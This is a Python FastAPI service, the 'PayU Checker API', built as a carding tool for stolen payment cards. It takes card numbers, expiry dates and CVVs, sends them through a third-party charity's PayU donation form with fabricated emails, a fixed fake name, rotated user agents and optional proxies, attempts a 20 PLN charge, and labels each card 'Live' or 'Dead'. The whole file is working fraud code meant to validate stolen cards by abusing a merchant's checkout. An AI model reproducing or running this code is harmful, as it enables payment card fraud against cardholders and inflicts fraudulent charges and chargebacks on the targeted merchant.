from fastapi import FastAPI, Query, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import StreamingResponse, JSONResponse
import re
import json
import time
import random
import string
import requests

app = FastAPI(title="PayU Checker API")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

def _random_email():
    chars = string.ascii_lowercase + string.digits
    user = ''.join(random.choices(chars, k=10))
    return f"{user}@gmail.com"

def _random_ua():
    versions = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    ]
    return random.choice(versions)

def _poll_status(session, order_id, token, ua, is_3ds, max_attempts=8, delay=3.5):
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': f'Bearer {token}',
        'referer': f'https://secure.payu.com/pay/?orderId={order_id}&token={token}',
        'user-agent': ua,
    }
    for _ in range(max_attempts):
        time.sleep(delay)
        try:
            r = session.get(f'https://secure.payu.com/api/front/orders/{order_id}/status', headers=headers, timeout=30)
            data = r.json()
            if data.get('category') not in ('IN_PROGRESS', 'NEW'):
                return data
        except:
            pass
    return {"category": "TIMEOUT_POLL", "is_3ds": is_3ds}

def event_stream(card_num, mm, yy, cvv_code, site_url, proxy_str):
    session = requests.Session()
    try:
        if proxy_str:
            session.proxies = {
                'http': f"http://{proxy_str}" if not proxy_str.startswith('http') else proxy_str,
                'https': f"http://{proxy_str}" if not proxy_str.startswith('http') else proxy_str,
            }
        email = _random_email()
        ua = _random_ua()
        name = "Jan Kowalski"
        if len(yy) == 2:
            yy = '20' + yy

        if proxy_str:
            proxy_ip = proxy_str.split('@')[-1] if '@' in proxy_str else proxy_str
            yield f"data: {json.dumps({'type': 'log', 'msg': f'Connecting via Proxy -> {proxy_ip}', 'class': 'warn'})}\n\n"
        else:
            yield f"data: {json.dumps({'type': 'log', 'msg': 'Connecting using Railway Default IP...', 'class': 'info'})}\n\n"
           
        yield f"data: {json.dumps({'type': 'log', 'msg': 'Initiating connection to Merchant API...', 'class': 'info'})}\n\n"
       
        if 'horse_payu' in site_url or 'ajax' in site_url:
            ajax_url = site_url if site_url.endswith('/') else site_url + '/'
            headers1 = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': site_url.split('/ajax')[0] if '/ajax' in site_url else site_url.rsplit('/', 1)[0],
                'referer': site_url,
                'user-agent': ua,
                'x-requested-with': 'XMLHttpRequest',
            }
            data1 = {'amount': '20', 'firstname': name.split()[0], 'lastname': name.split()[1], 'email': email, 'extra': ''}
        else:
            ajax_url = site_url
            headers1 = {
                'accept': 'text/html',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': site_url.rsplit('/', 1)[0],
                'referer': site_url,
                'user-agent': ua,
            }
            data1 = {'name': name, 'email': email, 'amount': '20', 'purpose': 'Donation'}

        r1 = session.post(ajax_url, headers=headers1, data=data1, allow_redirects=False, timeout=30)
        order_id, token = None, None
        loc = r1.headers.get('Location', '')
        body = r1.text
        search_pool = loc + " " + body
       
        oid = re.search(r'orderId=([^&]+)', search_pool)
        tok = re.search(r'token=([^&]+)', search_pool)
        if oid: order_id = oid.group(1)
        if tok: token = tok.group(1)

        if not order_id or not token:
            yield f"data: {json.dumps({'type': 'log', 'msg': 'Failed to extract Order ID or Token.', 'class': 'error'})}\n\n"
            yield f"data: {json.dumps({'type': 'result', 'msg': 'Failed to extract Order ID', 'status': 'error'})}\n\n"
            return

        yield f"data: {json.dumps({'type': 'log', 'msg': f'Merchant Order Created -> ID: {order_id}', 'class': 'success'})}\n\n"

        try:
            page_html = session.get('https://secure.payu.com/pay/', params={'orderId': order_id, 'token': token}, headers={'user-agent': ua}, timeout=30).text
            amt_match = re.search(r'"totalAmount"\s*:\s*"?(\d+)"?', page_html)
            final_amount = int(amt_match.group(1)) if amt_match else 2000
        except:
            final_amount = 2000

        headers3 = {
            'accept': '*/*', 'authorization': f'Bearer {token}', 'content-type': 'application/json',
            'origin': 'https://secure.payu.com', 'referer': f'https://secure.payu.com/pay/?orderId={order_id}&token={token}',
            'user-agent': ua,
        }
        json3 = {'posId': 'PAYU S.A.', 'type': 'SINGLE', 'card': {'number': card_num, 'cvv': cvv_code, 'expirationMonth': mm, 'expirationYear': yy}}
       
        r3 = session.post('https://secure.payu.com/api/front/tokens', headers=headers3, json=json3, timeout=30)
        token_data = r3.json()
        card_token = token_data.get('value')

        if not card_token:
            err = token_data.get('error', {})
            err_msg = err.get('message', str(err)) if isinstance(err, dict) else str(err)
            yield f"data: {json.dumps({'type': 'result', 'msg': f'Card Declined: {err_msg}', 'status': 'error'})}\n\n"
            return

        yield f"data: {json.dumps({'type': 'log', 'msg': 'Card tokenized successfully.', 'class': 'success'})}\n\n"

        masked = card_num[:6] + '*' * 6 + card_num[-4:]
        json4 = {
            'email': email, 'firstName': name.split()[0], 'lastName': name.split()[1],
            'currency': 'PLN', 'amount': final_amount,
            'payMethod': {'type': 'c', 'token': card_token, 'cardDetails': {'maskedCardNumber': masked}},
            'browserData': {'screenWidth': 800, 'javaEnabled': False, 'timezoneOffset': -330, 'screenHeight': 1280, 'userAgent': ua, 'colorDepth': 24, 'language': 'en-US', 'challengeWindowSize': '04'},
            'language': 'en',
        }
        r4 = session.post(f'https://secure.payu.com/api/front/orders/{order_id}/payments', headers=headers3, json=json4, timeout=30)
        pay_data = r4.json()

        if pay_data.get('status') == 'ERROR' or pay_data.get('errorCode'):
            err_desc = pay_data.get('error', {}).get('description', '') if isinstance(pay_data.get('error'), dict) else str(pay_data.get('errorCode', ''))
            yield f"data: {json.dumps({'type': 'result', 'msg': f'Payment declined: {err_desc}', 'status': 'error'})}\n\n"
            return

        continue_url = pay_data.get('continueUrl', '')
        is_3ds = 'threeds' in continue_url
        if is_3ds:
            yield f"data: {json.dumps({'type': 'log', 'msg': '3DS Security protocol triggered...', 'class': 'warn'})}\n\n"
        
        final_status = _poll_status(session, order_id, token, ua, is_3ds)
        category = final_status.get('category', '')
        value = final_status.get('value', '')

        if category == 'SUCCESS':
            yield f"data: {json.dumps({'type': 'result', 'msg': 'Payment Successful', 'status': 'success', 'raw': final_status})}\n\n"
        else:
            msg = f'Payment declined: {value}' if value else f'{category}'
            yield f"data: {json.dumps({'type': 'result', 'msg': msg, 'status': 'error', 'raw': final_status})}\n\n"

    except Exception as e:
        yield f"data: {json.dumps({'type': 'result', 'msg': f'Error: {str(e)}', 'status': 'error'})}\n\n"
    finally:
        session.close()

# ================== JSON ENDPOINT ==================
@app.get("/check")
async def check_card(
    cc: str = Query(...),
    site: str = Query("https://beta3.centaurus.org.pl/ajax/horse_payu/"),
    proxy: str = Query(None)
):
    start_time = time.time()
    
    parts = cc.split('|')
    if len(parts) != 4:
        raise HTTPException(status_code=400, detail="Format: cc|mm|yy|cvv")
   
    card_num, mm, yy, cvv_code = parts
    mm = mm.zfill(2)
    if len(yy) == 2:
        yy = '20' + yy

    result = None
    for chunk in event_stream(card_num, mm, yy, cvv_code, site, proxy):
        try:
            parsed = json.loads(chunk.replace("data: ", "").strip())
            if parsed.get('type') == 'result':
                result = parsed
                break
        except:
            continue

    elapsed = round(time.time() - start_time, 2)

    if not result:
        return JSONResponse(content={
            "Gateway": "PayU Payment",
            "CC": cc,
            "Result": "Unknown Error",
            "Response": "No response",
            "Status": "error",
            "3DS": "Dead",
            "Time": f"{elapsed}s",
            "Amount": "20 PLN"
        })

    raw = result.get('raw', {})
    response_value = raw.get('value') or raw.get('category') or "UNKNOWN"
    
    # 3DS Logic yang lebih tepat
    cat_upper = str(raw.get('category', '')).upper()
    val_upper = str(raw.get('value', '')).upper()
    is_live = any(x in val_upper or x in cat_upper for x in ["WARNING_CONTINUE", "3DS_REQUIRED", "CHALLENGE"])

    return JSONResponse(content={
        "Gateway": "PayU Payment",
        "CC": cc,
        "Result": result.get('msg'),
        "Response": response_value,
        "Status": result.get('status'),
        "3DS": "Live" if is_live else "Dead",
        "Time": f"{elapsed}s",
        "Amount": "20 PLN"
    })

@app.get("/check/stream")
async def check_card_stream(
    cc: str = Query(...),
    site: str = Query("https://beta3.centaurus.org.pl/ajax/horse_payu/"),
    proxy: str = Query(None)
):
    parts = cc.split('|')
    if len(parts) != 4:
        raise HTTPException(status_code=400, detail="Format: cc|mm|yy|cvv")
   
    card_num, mm, yy, cvv_code = parts
    mm = mm.zfill(2)
    if len(yy) == 2:
        yy = '20' + yy
       
    return StreamingResponse(event_stream(card_num, mm, yy, cvv_code, site, proxy), media_type="text/event-stream")
